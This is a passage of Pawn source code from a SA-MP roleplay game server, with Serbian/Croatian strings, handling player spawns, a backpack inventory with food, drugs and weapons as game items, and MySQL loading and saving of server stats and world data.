		        {
					if(PlayerInfo[playerid][xAdmin] != 0 || PlayerInfo[playerid][xSpecAdmin] != 0 || PlayerInfo[playerid][xGamemaster] != 0)
					{
						SMG_SetPlayerPos( playerid, 4312.1948,3014.6899,4.2646 );
						SetPlayerFacingAngle( playerid, 0.0000);
						UcitajObjekte( playerid );
						SetCameraBehindPlayer( playerid );
						SetPlayerInterior( playerid, 0 );
					}
					else
					{
						SMG_SetPlayerPos( playerid, SpawnAerodrom[ rand ][ 0 ], SpawnAerodrom[ rand ][ 1 ], SpawnAerodrom[ rand ][ 2 ] );
						uInterijeru[ playerid ] = -1;
						SetCameraBehindPlayer( playerid );
						SetPlayerInterior( playerid, 0 );
						SetPlayerVirtualWorld(playerid, 0);
						PlayerInfo[ playerid ][ xSpawn ] = SPAWN_OBICAN_LS_1;
						sql_user_update_integer( playerid, "spawn", PlayerInfo[ playerid ][ xSpawn ] );
					}
				}
			    case SPAWN_OBICAN_LS_1:
				{
			        SMG_SetPlayerPos( playerid, SpawnAerodrom[ rand ][ 0 ], SpawnAerodrom[ rand ][ 1 ], SpawnAerodrom[ rand ][ 2 ] );

					uInterijeru[ playerid ] = -1;
					UcitajObjekte( playerid );
					SetCameraBehindPlayer( playerid );
					SetPlayerInterior( playerid, 0 );
					SetPlayerVirtualWorld(playerid, 0);
				}
				case SPAWN_OBICAN_LS_2:
				{
			        SMG_SetPlayerPos( playerid, SpawnAerodrom[ rand ][ 0 ], SpawnAerodrom[ rand ][ 1 ], SpawnAerodrom[ rand ][ 2 ] );

					uInterijeru[ playerid ] = -1;
					UcitajObjekte( playerid );
					SetCameraBehindPlayer( playerid );
					SetPlayerInterior( playerid, 0 );
					SetPlayerVirtualWorld(playerid, 0);
				}
			    case SPAWN_BAZA:
				{
					SMG_SetPlayerPos( playerid, org_info[ OrgID ][ oSpawnPoint ][ 0 ], org_info[ OrgID ][ oSpawnPoint ][ 1 ] , org_info[ OrgID ][ oSpawnPoint ][ 2 ] );
					UcitajObjekte( playerid );
					SetCameraBehindPlayer( playerid );
					SetPlayerInterior( playerid, org_info[ OrgID ][ oInt ] );
					SetPlayerVirtualWorld( playerid, org_info[ OrgID ][ oVw ] );
					inOrgInt[ playerid ] = OrgID;
					SetPlayerTime( playerid, 12, 0 );
				}
				case SPAWN_IMOVINA_1:
				{
					if( PlayerInfo[ playerid ][ xProperty ][ 0 ] != -1 )
					{
					    new i = PlayerInfo[ playerid ][ xProperty ][ 0 ];

					    SMG_SetPlayerPos( playerid, II[ i ][ iExit ][ 0 ], II[ i ][ iExit ][ 1 ], II[ i ][ iExit ][ 2 ] );
				  		UcitajObjekte( playerid );
					    SetCameraBehindPlayer( playerid );
				    	SetPlayerInterior( playerid, II[ i ][ iInterior ] );
						SetPlayerVirtualWorld( playerid, II[ i ][ iVW ] );
						inProperty[ playerid ] = i;
						SetPlayerTime( playerid, 12, 0 );
					}
					else
					{
					    SMG_SetPlayerPos( playerid, SpawnAerodrom[ rand ][ 0 ], SpawnAerodrom[ rand ][ 1 ], SpawnAerodrom[ rand ][ 2 ] );

						uInterijeru[ playerid ] = -1;
						UcitajObjekte( playerid );
						SetCameraBehindPlayer( playerid );
						SetPlayerInterior( playerid, 0 );
						SetPlayerVirtualWorld(playerid, 0);
						PlayerInfo[ playerid ][ xSpawn ] = SPAWN_OBICAN_LS_1;
						sql_user_update_integer( playerid, "spawn", PlayerInfo[ playerid ][ xSpawn ] );
					}

				}
				case SPAWN_IMOVINA_2:
				{
				    if( PlayerInfo[ playerid ][ xProperty ][ 1 ] != -1 )
					{
					    new i = PlayerInfo[ playerid ][ xProperty ][ 1 ];

					    SMG_SetPlayerPos( playerid, II[ i ][ iExit ][ 0 ], II[ i ][ iExit ][ 1 ], II[ i ][ iExit ][ 2 ] );
				  		UcitajObjekte( playerid );
					    SetCameraBehindPlayer( playerid );
				    	SetPlayerInterior( playerid, II[ i ][ iInterior ] );
						SetPlayerVirtualWorld( playerid, II[ i ][ iVW ] );
						inProperty[ playerid ] = i;
						SetPlayerTime( playerid, 12, 0 );
					}
					else
					{
					    SMG_SetPlayerPos( playerid, SpawnAerodrom[ rand ][ 0 ], SpawnAerodrom[ rand ][ 1 ], SpawnAerodrom[ rand ][ 2 ] );

						uInterijeru[ playerid ] = -1;
						UcitajObjekte( playerid );
						SetCameraBehindPlayer( playerid );
						SetPlayerInterior( playerid, 0 );
						SetPlayerVirtualWorld(playerid, 0);
						PlayerInfo[ playerid ][ xSpawn ] = SPAWN_OBICAN_LS_1;
						sql_user_update_integer( playerid, "spawn", PlayerInfo[ playerid ][ xSpawn ] );
					}
				}
				case SPAWN_IMOVINA_3:
				{
				    if( PlayerInfo[ playerid ][ xProperty ][ 2 ] != -1 )
					{
					    new i = PlayerInfo[ playerid ][ xProperty ][ 2 ];

					    SMG_SetPlayerPos( playerid, II[ i ][ iExit ][ 0 ], II[ i ][ iExit ][ 1 ], II[ i ][ iExit ][ 2 ] );
				  		UcitajObjekte( playerid );
					    SetCameraBehindPlayer( playerid );
				    	SetPlayerInterior( playerid, II[ i ][ iInterior ] );
						SetPlayerVirtualWorld( playerid, II[ i ][ iVW ] );
						inProperty[ playerid ] = i;
						SetPlayerTime( playerid, 12, 0 );
					}
					else
					{
					    SMG_SetPlayerPos( playerid, SpawnAerodrom[ rand ][ 0 ], SpawnAerodrom[ rand ][ 1 ], SpawnAerodrom[ rand ][ 2 ] );

						uInterijeru[ playerid ] = -1;
						UcitajObjekte( playerid );
						SetCameraBehindPlayer( playerid );
						SetPlayerInterior( playerid, 0 );
						SetPlayerVirtualWorld(playerid, 0);
						PlayerInfo[ playerid ][ xSpawn ] = SPAWN_OBICAN_LS_1;
						sql_user_update_integer( playerid, "spawn", PlayerInfo[ playerid ][ xSpawn ] );
					}
				}
                case SPAWN_RENT:
				{
					if( PlayerInfo[ playerid ][ xRentID ] != -1 )
					{
					    new i = PlayerInfo[ playerid ][ xRentID ];

					    SMG_SetPlayerPos( playerid, II[ i ][ iExit ][ 0 ], II[ i ][ iExit ][ 1 ], II[ i ][ iExit ][ 2 ] );
					    SetCameraBehindPlayer( playerid );
				        UcitajObjekte( playerid );
				    	SetPlayerInterior( playerid, II[ i ][ iInterior ] );
						SetPlayerVirtualWorld( playerid, II[ i ][ iVW ] );
						inProperty[ playerid ] = i;
						SetPlayerTime( playerid, 12, 0 );
					}
					else
					{
					    SMG_SetPlayerPos( playerid, SpawnAerodrom[ rand ][ 0 ], SpawnAerodrom[ rand ][ 1 ], SpawnAerodrom[ rand ][ 2 ] );

						uInterijeru[ playerid ] = -1;
						UcitajObjekte( playerid );
						SetCameraBehindPlayer( playerid );
						SetPlayerInterior( playerid, 0 );
						SetPlayerVirtualWorld(playerid, 0);
						PlayerInfo[ playerid ][ xSpawn ] = SPAWN_OBICAN_LS_1;
						sql_user_update_integer( playerid, "spawn", PlayerInfo[ playerid ][ xSpawn ] );
					}
				}
			}
		}
	}
	return 1;
}
//------------------------------------------------------------------------------
_:public RemoveAttachedObject( playerid, slot )
{
	if( IsPlayerAttachedObjectSlotUsed( playerid, slot ) )
	{
	    RemovePlayerAttachedObject( playerid, slot );
	}
	return 1;
}
//------------------------------------------------------------------------------
_:public OpenBackpack(playerid)
{
	new str[612];
	format(str, sizeof(str),
		"#\tItem\tKolicina\n\
		{4282C0}(1).\t{FFFFFF}Pizza\t%d\n\
		{4282C0}(2).\t{FFFFFF}Sok\t%d\n\
		{4282C0}(3).\t{FFFFFF}Pivo\t%d\n\
		{4282C0}(4).\t{FFFFFF}Hamburger\t%d\n\
		{4282C0}(5).\t{FFFFFF}Riba\t%d\n\
		{4282C0}(6).\t{FFFFFF}Laptop\t%s\n\
		{4282C0}(7).\t{FFFFFF}Droga\t%d\n\
		{4282C0}(8).\t{FFFFFF}Materijali\t%d\n\
		{4282C0}(9).\t{FFFFFF}Oruzje (1) - %s\t%d\n\
		{4282C0}(10).\t{FFFFFF}Oruzje (2) - %s\t%d\n\
		{4282C0}(11).\t{FFFFFF}Oruzje (3) - %s\t%d",
			PlayerInfo[playerid][xTorba_Pizza],
			PlayerInfo[playerid][xTorba_Sok],
			PlayerInfo[playerid][xTorba_Pivo],
			PlayerInfo[playerid][xTorba_Hambi],
			PlayerInfo[playerid][xTorba_Riba],
			((PlayerInfo[playerid][xTorba_Laptop]) ? ("{00FF00}Imate") : ("{FF0000}Nemate")),
			PlayerInfo[playerid][xTorba_Droga],
			PlayerInfo[playerid][xMaterijali],
			WeaponInfos[ PlayerInfo[playerid][xTorba_Oruzje][0] ][ wName ],
			PlayerInfo[playerid][xTorba_OruzjeM][0],
			WeaponInfos[ PlayerInfo[playerid][xTorba_Oruzje][1] ][ wName ],
			PlayerInfo[playerid][xTorba_OruzjeM][1],
			WeaponInfos[ PlayerInfo[playerid][xTorba_Oruzje][2] ][ wName ],
			PlayerInfo[playerid][xTorba_OruzjeM][2]);
	ShowPlayerDialog(playerid, dialog_BACKPACK, DIALOG_STYLE_TABLIST_HEADERS, "Torba", str, "Odaberi", "Zatvori");
}

_:public UseBackpackItem(playerid, itemid)
{
	switch(itemid)
	{
		case ITEM_PIZZA:
		{
		    if(PlayerInfo[playerid][xTorba_Pizza] < 1) return SendErrorMessage(playerid, "Nemate vise pizze.");

	        DodajIgracuHP( playerid, 50 );

	        if( !IsPlayerAttachedObjectSlotUsed( playerid, OBJECT_SLOT_MAIN ) )
			{
			    SetPlayerAttachedObject(playerid, OBJECT_SLOT_MAIN, 2702, 6, 0.173041, 0.049197, 0.056789, 0.000000, 274.166107, 299.057983, 1.000000, 1.000000, 1.000000);
				SetPlayerTimerEx(playerid, "RemoveAttachedObject", 3000, false, "ii", playerid, OBJECT_SLOT_MAIN);
			}
			PlayerInfo[playerid][xTorba_Pizza]--;
			sql_user_update_integer(playerid, "xTorba_Pizza", PlayerInfo[playerid][xTorba_Pizza]);

			ApplyAnimation( playerid, "FOOD", "EAT_Burger", 4.1, 0, 0, 0, 0, 0, 1 );
	        SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s jede pizzu.", ImeIgraca( playerid ) );
    	}
		case ITEM_SOK:
		{
		    if(PlayerInfo[playerid][xTorba_Sok] < 1) return SendErrorMessage(playerid, "Nemate vise soka.");

		    DodajIgracuHP( playerid, 5 );

			SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s pije sok.", ImeIgraca( playerid ) ); 

        	PlayerInfo[playerid][xTorba_Sok]--;
			sql_user_update_integer(playerid, "xTorba_Sok", PlayerInfo[playerid][xTorba_Sok]);

	    	SetPlayerSpecialAction( playerid, SPECIAL_ACTION_DRINK_SPRUNK );
    	}
		case ITEM_PIVO:
		{
		    if(PlayerInfo[playerid][xTorba_Pivo] < 1) return SendErrorMessage(playerid, "Nemate vise piva.");

	    	new drunklevel = GetPlayerDrunkLevel( playerid );
			SetPlayerDrunkLevel( playerid, drunklevel + 200);

			if( drunklevel > 2000 )
			{
				GameTextForPlayer( playerid, "~p~Pijani ste", 3500, 1);
			}
			SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s pije pivo.", ImeIgraca( playerid ) ); 

        	PlayerInfo[playerid][xTorba_Pivo]--;
			sql_user_update_integer(playerid, "xTorba_Pivo", PlayerInfo[playerid][xTorba_Pivo]);

		    SetPlayerSpecialAction( playerid, SPECIAL_ACTION_DRINK_WINE );
		}
		case ITEM_HAMBI:
		{
		    if(PlayerInfo[playerid][xTorba_Hambi] < 1) return SendErrorMessage(playerid, "Nemate vise hamburgera.");

		    DodajIgracuHP( playerid, 35 );

			if( !IsPlayerAttachedObjectSlotUsed( playerid, OBJECT_SLOT_MAIN ) )
			{
			    SetPlayerAttachedObject(playerid, OBJECT_SLOT_MAIN, 2703, 6, 0.078287, 0.019677, -0.001004, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000);
				SetPlayerTimerEx(playerid, "RemoveAttachedObject", 3000, false, "ii", playerid, OBJECT_SLOT_MAIN);
			}

        	PlayerInfo[playerid][xTorba_Hambi]--;
			sql_user_update_integer(playerid, "xTorba_Hambi", PlayerInfo[playerid][xTorba_Hambi]);

			ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1, 0, 0, 0, 0, 0, 1);
	        SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s jede hamburger.", ImeIgraca( playerid ) ); 
    	}
		case ITEM_RIBA:
		{
		    if(PlayerInfo[playerid][xTorba_Riba] < 1) return SendErrorMessage(playerid, "Nemate vise ribe.");

		    DodajIgracuHP( playerid, 100 );

        	PlayerInfo[playerid][xTorba_Riba]--;
			sql_user_update_integer(playerid, "xTorba_Riba", PlayerInfo[playerid][xTorba_Riba]);

			ApplyAnimation(playerid, "VENDING", "VEND_Eat_P", 4.1, 0, 0, 0, 0, 0, 1);
	        SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s jede ribu.", ImeIgraca( playerid ) ); 
		}
		case ITEM_LAPTOP:
		{
		    if(!PlayerInfo[playerid][xTorba_Laptop]) return SendErrorMessage(playerid, "Nemate laptop.");

		    if( IsPlayerAttachedObjectSlotUsed( playerid, OBJECT_SLOT_MAIN ) ) return SendErrorMessage( playerid, "Vec imate objekt u desnoj ruci.");
			SetPlayerAttachedObject( playerid, OBJECT_SLOT_MAIN, 19893, 6, 0.04, -0.00, -0.13, -109.0, -2.0, -94.0, 1.00, 1.00, 1.00 );

		    LaptopRuke[ playerid ] = true;
        	PlayerInfo[playerid][xTorba_Laptop] = false;
			sql_user_update_integer(playerid, "xTorba_Laptop", PlayerInfo[playerid][xTorba_Laptop]);

		    ApplyAnimation( playerid, "CARRY", "crry_prtial", 4.1, 0, 1, 1, 1, 1, 1 );
		    SendClientMessage( playerid, ZUTA, "(TORBA): Izvadio si laptop iz torbe, ako ga ne vratite nazad izgubicete ga." );
		}
		case ITEM_DROGA:
		{
		    if(PlayerInfo[playerid][xTorba_Droga] < 5) return SendErrorMessage(playerid, "Nemate dovoljno droge (5g).");

			if( PlayerDrugged[ playerid ] == true ) return SendErrorMessage( playerid, "Vec si nadrogiran. Ne mozes koristiti drogu dok si nadrogiran!");
	        if( IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Ne mozes da se drogiras dok si u kolima." );

        	PlayerInfo[playerid][xTorba_Droga] -= 5;
			sql_user_update_integer(playerid, "xTorba_Droga", PlayerInfo[playerid][xTorba_Droga]);

		    DodajIgracuArmour( playerid, 25 );
			SetPlayerWeather( playerid, 1880);
			SetPlayerDrunkLevel( playerid, 28000);
			PlayerDrugged[ playerid ] = true;
	  		SetPlayerTime( playerid, 12, 0);
			PlayerDruggedSeconds[playerid] = 10;
			ApplyAnimation( playerid, "CRACK", "crckdeth2", 4.0, 0, 0, 0, 0, 0, 1);

			SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s koristi drogu.", ImeIgraca( playerid ) );
		}
		case ITEM_MATS:
		{
		    if( PlayerInfo[ playerid ][ xClan ] == 0 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
			if( GetFactionType( playerid ) == ORG_TIP_MAFIJA || GetFactionType( playerid ) == ORG_TIP_BANDA )
			{
			    if( inOrgInt[ playerid ] != PlayerInfo[ playerid ][ xClan ] ) return SendErrorMessage( playerid, "Morate biti u interijeru vase organizacije." );
			    if(PlayerInfo[playerid][xMaterijali] == 0) return SendErrorMessage(playerid, "Nemate materijala.");

				ShowPlayerDialog( playerid, dialog_MAKEGUN, DIALOG_STYLE_TABLIST_HEADERS, D_NASLOV, "Naziv\tPotrebno Matsa\tMunicija\n\
																									Palica\t400\t-\n\
																									Noz\t1500\t-\n\
																									Colt\t2500\t100\n\
																									Deagle\t7000\t100\n\
																									Shotgun\t10000\t100\n\
																									MP5\t11000\t200\n\
																									AK47\t11500\t150\n\
																									M16\t12000\t150a\n\
																									Sniper\t18000\t50", "Odaberi", "Odustani" );
		        ChosenWeapon[ playerid ] = 0;
		   	}
		   	else SendErrorMessage( playerid, "Samo mafija i banda." );
		}
		case ITEM_ORUZJE1:
		{
		    if(PlayerInfo[playerid][xTorba_Oruzje][0] == 0) return SendErrorMessage(playerid, "Nemate oruzje u slotu 1.");
		    ShowPlayerDialog(playerid, dialog_BACKPACKTAKEGUN_1, DIALOG_STYLE_INPUT, "Torba - Gun 1", "{FFFFFF}* Unesite kolicinu metaka koliko zelite uzeti iz torbe:", "Uzmi", "Odustani");
		}
		case ITEM_ORUZJE2:
		{
		    if(PlayerInfo[playerid][xTorba_Oruzje][1] == 0) return SendErrorMessage(playerid, "Nemate oruzje u slotu 2.");
		    ShowPlayerDialog(playerid, dialog_BACKPACKTAKEGUN_2, DIALOG_STYLE_INPUT, "Torba - Gun 2", "{FFFFFF}* Unesite kolicinu metaka koliko zelite uzeti iz torbe:", "Uzmi", "Odustani");
		}
		case ITEM_ORUZJE3:
		{
		    if(PlayerInfo[playerid][xTorba_Oruzje][2] == 0) return SendErrorMessage(playerid, "Nemate oruzje u slotu 3.");
		    ShowPlayerDialog(playerid, dialog_BACKPACKTAKEGUN_3, DIALOG_STYLE_INPUT, "Torba - Gun 3", "{FFFFFF}* Unesite kolicinu metaka koliko zelite uzeti iz torbe:", "Uzmi", "Odustani");
		}
	}
	return 1;
}

_:public DropBackpackItem(playerid, itemid)
{
	switch(itemid)
	{
		case ITEM_PIZZA:
		{
		    if(PlayerInfo[playerid][xTorba_Pizza] < 1) return SendErrorMessage(playerid, "Nemate vise pizze.");

            PlayerInfo[playerid][xTorba_Pizza] = 0;
            sql_user_update_integer(playerid, "xTorba_Pizza", PlayerInfo[playerid][xTorba_Pizza]);

	        SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s baca pizzu u kontejner.", ImeIgraca(playerid));
    	}
		case ITEM_SOK:
		{
		    if(PlayerInfo[playerid][xTorba_Sok] < 1) return SendErrorMessage(playerid, "Nemate vise soka.");

            PlayerInfo[playerid][xTorba_Sok] = 0;
            sql_user_update_integer(playerid, "xTorba_Sok", PlayerInfo[playerid][xTorba_Sok]);

	        SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s baca sok u kontejner.", ImeIgraca(playerid));
    	}
		case ITEM_PIVO:
		{
		    if(PlayerInfo[playerid][xTorba_Pivo] < 1) return SendErrorMessage(playerid, "Nemate vise pivo.");

            PlayerInfo[playerid][xTorba_Pivo] = 0;
            sql_user_update_integer(playerid, "xTorba_Pivo", PlayerInfo[playerid][xTorba_Pivo]);

	        SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s baca pivo u kontejner.", ImeIgraca(playerid));
		}
		case ITEM_HAMBI:
		{
		    if(PlayerInfo[playerid][xTorba_Hambi] < 1) return SendErrorMessage(playerid, "Nemate vise hamburgera.");

            PlayerInfo[playerid][xTorba_Hambi] = 0;
            sql_user_update_integer(playerid, "xTorba_Hambi", PlayerInfo[playerid][xTorba_Hambi]);

	        SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s baca hamburgere u kontejner.", ImeIgraca(playerid));
    	}
		case ITEM_RIBA:
		{
		    if(PlayerInfo[playerid][xTorba_Riba] < 1) return SendErrorMessage(playerid, "Nemate vise ribe.");

            PlayerInfo[playerid][xTorba_Riba] = 0;
            sql_user_update_integer(playerid, "xTorba_Riba", PlayerInfo[playerid][xTorba_Riba]);

	        SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s baca ribu u kontejner.", ImeIgraca(playerid));
		}
		case ITEM_LAPTOP:
		{
		    if(PlayerInfo[playerid][xTorba_Laptop] == false) return SendErrorMessage(playerid, "Nemate laptop.");

            PlayerInfo[playerid][xTorba_Laptop] = false;
            sql_user_update_integer(playerid, "xTorba_Laptop", PlayerInfo[playerid][xTorba_Laptop]);

	        SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s baca laptop u kontejner.", ImeIgraca(playerid));
		}
		case ITEM_DROGA:
		{
		    if(PlayerInfo[playerid][xTorba_Droga] < 1) return SendErrorMessage(playerid, "Nemate vise droge.");

            PlayerInfo[playerid][xTorba_Droga] = 0;
            sql_user_update_integer(playerid, "xTorba_Droga", PlayerInfo[playerid][xTorba_Droga]);

	        SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s baca kesicu praha u kontejner.", ImeIgraca(playerid));
		}
		case ITEM_MATS:
		{
		    if(PlayerInfo[playerid][xMaterijali] < 100) return SendErrorMessage(playerid, "Nemate 100 materijala.");

            PlayerInfo[playerid][xMaterijali] -= 100;
            sql_user_update_integer(playerid, "materials", PlayerInfo[playerid][xMaterijali]);

	        SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s baca materijale u kontejner.", ImeIgraca(playerid));			
		}
		case ITEM_ORUZJE1:
		{
		    if(PlayerInfo[playerid][xTorba_Oruzje][0] == 0) return SendErrorMessage(playerid, "Nemate oruzje u slotu 1.");

            PlayerInfo[playerid][xTorba_Oruzje][0] = 0;
            PlayerInfo[playerid][xTorba_OruzjeM][0] = 0;
            sql_user_update_integer(playerid, "xTorba_Oruzje_1", PlayerInfo[playerid][xTorba_Oruzje][0]);
            sql_user_update_integer(playerid, "xTorba_OruzjeM_1", PlayerInfo[playerid][xTorba_OruzjeM][0]);

	        SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s baca nepoznat tezak metal u kontejner.", ImeIgraca(playerid));
		}
		case ITEM_ORUZJE2:
		{
		    if(PlayerInfo[playerid][xTorba_Oruzje][1] == 0) return SendErrorMessage(playerid, "Nemate oruzje u slotu 2.");

            PlayerInfo[playerid][xTorba_Oruzje][1] = 0;
            PlayerInfo[playerid][xTorba_OruzjeM][1] = 0;
            sql_user_update_integer(playerid, "xTorba_Oruzje_2", PlayerInfo[playerid][xTorba_Oruzje][1]);
            sql_user_update_integer(playerid, "xTorba_OruzjeM_2", PlayerInfo[playerid][xTorba_OruzjeM][1]);

	        SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s baca nepoznat tezak metal u kontejner.", ImeIgraca(playerid));
		}
		case ITEM_ORUZJE3:
		{
		    if(PlayerInfo[playerid][xTorba_Oruzje][2] == 0) return SendErrorMessage(playerid, "Nemate oruzje u slotu 3.");

            PlayerInfo[playerid][xTorba_Oruzje][2] = 0;
            PlayerInfo[playerid][xTorba_OruzjeM][2] = 0;
            sql_user_update_integer(playerid, "xTorba_Oruzje_3", PlayerInfo[playerid][xTorba_Oruzje][2]);
            sql_user_update_integer(playerid, "xTorba_OruzjeM_3", PlayerInfo[playerid][xTorba_OruzjeM][2]);

	        SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s baca nepoznat tezak metal u kontejner.", ImeIgraca(playerid));
		}
	}
	return 1;
}
//------------------------------------------------------------------------------
_:public OnServerStatsLoad( )
{
    new rows, fields;
    cache_get_data( rows, fields, mSQL );

	if( rows )
	{
 		ServerInfo[ RegistrovanihKorisnika ] 		= cache_get_field_content_int( 0, "RegistrovanihKorisnika" );
   		ServerInfo[ BanovanihKorisnika ] 			= cache_get_field_content_int( 0, "BanovanihKorisnika" );
     	ServerInfo[ KikovanihKorisnika ] 			= cache_get_field_content_int( 0, "KikovanihKorisnika" );
      	ServerInfo[ BrojWarnova ] 					= cache_get_field_content_int( 0, "BrojWarnova" );
      	ServerInfo[ BrojPosetaServeru ] 			= cache_get_field_content_int( 0, "BrojPosetaServeru" );
      	ServerInfo[ HappyHours ] 					= cache_get_field_content_int( 0, "HappyHours" );
      	ServerInfo[ HappyHoursLvl ] 				= cache_get_field_content_int( 0, "HappyHoursLvl" );
      	ServerInfo[ HappyJobs ] 					= cache_get_field_content_int( 0, "HappyJobs" );
      	ServerInfo[ PocetniLevel ] 					= cache_get_field_content_int( 0, "PocetniLevel" );
      	ServerInfo[ PocetniNovaca ] 				= cache_get_field_content_int( 0, "PocetniNovaca" );
      	ServerInfo[ KupovinaVozila ] 				= bool:cache_get_field_content_int( 0, "KupovinaVozila" );
      	ServerInfo[ Report ] 						= bool:cache_get_field_content_int( 0, "Report" );
      	ServerInfo[ Pitanja ] 						= bool:cache_get_field_content_int( 0, "Pitanja" );
      	ServerInfo[ RekordServera ] 				= cache_get_field_content_int( 0, "RekordServera" );
      	ServerInfo[ BankaNovac ] 					= cache_get_field_content_int( 0, "BankaNovac" );
      	ServerInfo[ Oglasi ] 						= bool:cache_get_field_content_int( 0, "Oglasi" );
      	ServerInfo[ Registracija ] 					= bool:cache_get_field_content_int( 0, "Registracija" );
      	ServerInfo[ ReactTime ] 					= cache_get_field_content_int( 0, "ReactTime" );

      	cache_get_field_content( 0, "ReactName", ServerInfo[ ReactName ], mSQL, MAX_PLAYER_NAME );

      	//

      	if(IsValidDynamic3DTextLabel(ServerInfo[ BankaNovacLabel ])) DestroyDynamic3DTextLabel(ServerInfo[ BankaNovacLabel ]);
				
		new str[ 128 ];
		format( str, sizeof( str ), "(SEF)\nTrenutno u sefu ima {FFFFFF}(%d/300.000$)", ServerInfo[ BankaNovac ] );
		CreateDynamic3DTextLabel(str, 0x4282C0FF, 1607.1238,-1019.2515,-28.6981, 10.0);
    	str[0] = EOS;

    	//

    	new str2[32];
		if(ServerInfo[HappyHours] == 0) format(str2, 32, "happyhours: ~r~(OFF)~n~");
		else if(ServerInfo[HappyHours] != 0 && ServerInfo[HappyHoursLvl] == 0) format(str2, 32, "happyhours: ~g~(x%d)~n~", ServerInfo[HappyHours]);
		else if(ServerInfo[HappyHours] != 0 && ServerInfo[HappyHoursLvl] != 0) format(str2, 32, "happyhours: ~g~(x%d<%d)~n~", ServerInfo[HappyHours], ServerInfo[HappyHoursLvl]);
		strcat(str, str2);

		if(ServerInfo[HappyJobs] == 0) format(str2, 32, "~w~happyjob: ~r~(OFF)");
		else format(str2, 32, "~w~happyjob: ~g~(x%d)", ServerInfo[HappyJobs]);
		strcat(str, str2);

		Ingame_gTD[4] = TextDrawCreate(0.977765, 435.979614, str);
		TextDrawLetterSize(Ingame_gTD[4], 0.116777, 0.574576);
		TextDrawAlignment(Ingame_gTD[4], 1);
		TextDrawColor(Ingame_gTD[4], -1);
		TextDrawSetShadow(Ingame_gTD[4], 0);
		TextDrawSetOutline(Ingame_gTD[4], 0);
		TextDrawBackgroundColor(Ingame_gTD[4], 255);
		TextDrawFont(Ingame_gTD[4], 2);
		TextDrawSetProportional(Ingame_gTD[4], 1);
		TextDrawSetShadow(Ingame_gTD[4], 0);

		//

	  	print("(U) SQL: Ucitao - Server Stats (ON)");
	}
	else print("(U) SQL: Ucitao - Server Stats (OFF) [nema row-a ili table] - OnGameModeExit STARTED!!"), SendRconCommand("exit");
	return 1;
}

_:public SaveServerStats( )
{
	static q[700];
	mysql_format(mSQL, q, sizeof(q),

	    "UPDATE `_stats`\
	    SET `RegistrovanihKorisnika` = '%d', `BanovanihKorisnika` = '%d', `KikovanihKorisnika` = '%d', `BrojWarnova` = '%d', `BrojPosetaServeru` = '%d', `HappyHours` = '%d', \
			`HappyHoursLvl` = '%d', `HappyJobs` = '%d', `PocetniLevel` = '%d', `PocetniNovaca` = '%d', `KupovinaVozila` = '%d', `Report` = '%d', \
			`Pitanja` = '%d', `RekordServera` = '%d', `BankaNovac` = '%d', `Oglasi` = '%d', `Registracija` = '%d', `ReactTime` = '%d', `ReactName` = '%s' \
		WHERE `ssSQLID` = '1'",

		ServerInfo[RegistrovanihKorisnika], ServerInfo[BanovanihKorisnika], ServerInfo[KikovanihKorisnika], ServerInfo[BrojWarnova], ServerInfo[BrojPosetaServeru], ServerInfo[HappyHours],
		ServerInfo[HappyHoursLvl], ServerInfo[HappyJobs], ServerInfo[PocetniLevel], ServerInfo[PocetniNovaca], ServerInfo[KupovinaVozila], ServerInfo[Report],
		ServerInfo[Pitanja], ServerInfo[RekordServera], ServerInfo[BankaNovac], ServerInfo[Oglasi], ServerInfo[Registracija], ServerInfo[ReactTime], ServerInfo[ReactName]);

	mysql_tquery(mSQL, q);
	return 1;
}

//------------------------------------------------------------------------------
_:public LoadScriptfiles() 
{
	mysql_tquery(mSQL, "SELECT propertys.*, 	IFNULL(users.p_name, 'Drzava') AS `p_name` FROM propertys 	LEFT JOIN users ON propertys.iOwnerSQLID 	= users.user_id ORDER BY iSQLID ASC", 		"OnPropertysLoad" );
	mysql_tquery(mSQL, "SELECT bussines.*, 		IFNULL(users.p_name, 'Drzava') AS `p_name` FROM bussines 	LEFT JOIN users ON bussines.b_owner_sqlID 	= users.user_id ORDER BY bussines_id ASC", 	"OnBussinesLoad" );

	mysql_tquery(mSQL, "SELECT * FROM `organizations`", 	"OnOrganizationsLoad");
	mysql_tquery(mSQL, "SELECT * FROM `gangzones`", 		"OnGangZonesLoad");
	mysql_tquery(mSQL, "SELECT * FROM `gates`", 			"OnGatesLoad");
	mysql_tquery(mSQL, "SELECT * FROM `rents`", 			"OnRentsLoad");
	mysql_tquery(mSQL, "SELECT * FROM `atms`", 				"OnATMsLoad");
	mysql_tquery(mSQL, "SELECT * FROM `containers`", 		"OnContainersLoad");
	mysql_tquery(mSQL, "SELECT * FROM `gps`", 				"OnGPSsLoad");
	mysql_tquery(mSQL, "SELECT * FROM `tiki`", 				"OnTikisLoad");

	#if XMAS_MOD == 1

		mysql_tquery( mSQL, "SELECT * FROM `xmas_trees`", 		"OnTreesLoad" );
		mysql_tquery( mSQL, "SELECT * FROM `xmas_presents`", 	"OnPresentsLoad" );

	#endif

	mysql_tquery( mSQL, "SELECT * FROM `_stats`", 			"OnServerStatsLoad" );
}
//------------------------------------------------------------------------------
DefineGatesAndDoors()
{
    GlobalnoPetnaestMinuta = gettime();

    //

    ZlataraOpljackana = gettime();
    ZlataraUToku = false;

